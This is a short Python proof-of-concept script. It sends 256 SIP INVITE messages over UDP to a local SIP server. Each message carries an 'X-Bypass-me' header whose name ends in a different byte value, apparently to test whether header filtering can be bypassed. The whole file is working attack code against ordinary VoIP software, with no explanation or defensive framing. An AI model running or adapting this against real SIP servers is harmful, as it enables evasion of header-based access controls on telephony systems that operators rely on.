#!/usr/bin/env python3
sipmsg  = "INVITE sip:headerbypass@localhost SIP/2.0\r\n"
sipmsg += "Via: SIP/2.0/UDP 127.0.0.1:48017;rport;branch=z9hG4bK-%s\r\n"
sipmsg += "Max-Forwards: 70\r\n"
sipmsg += "From: <sip:anon@localhost>;tag=%s\r\n"
sipmsg += "To: sip:whatever@whatever.local\r\n"
sipmsg += "Call-ID: %s\r\n"
sipmsg += "CSeq: 1 INVITE\r\n"
sipmsg += "Contact: <sip:1000@127.0.0.1:48017;transport=udp>\r\n"
sipmsg += "X-Bypass-me%s: lol\r\n"
sipmsg += "Content-Length: 237\r\n"
sipmsg += "Content-Type: application/sdp\r\n"
sipmsg += "\r\n"
sipmsg += "v=0\r\n"
sipmsg += "o=- 1594727878 1594727878 IN IP4 127.0.0.1\r\n"
sipmsg += "s=-\r\n"
sipmsg += "c=IN IP4 127.0.0.1\r\n"
sipmsg += "t=0 0\r\n"
sipmsg += "m=audio 58657 RTP/AVP 0 8 96 101\r\n"
sipmsg += "a=rtpmap:101 telephone-event/8000/1\r\n"
sipmsg += "a=rtpmap:0 PCMU/8000/1\r\n"
sipmsg += "a=rtpmap:8 PCMA/8000/1\r\n"
sipmsg += "a=rtpmap:96 opus/8000/2\r\n"
sipmsg += "a=sendrecv\r\n"

target = ("127.0.0.1",5060)

import socket
import time
s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
s.bind(("0.0.0.0",5088))
for i in range(256):
    data = sipmsg % (i,i,i,chr(i))
    s.sendto(data.encode("utf-8"), target)
time.sleep(5)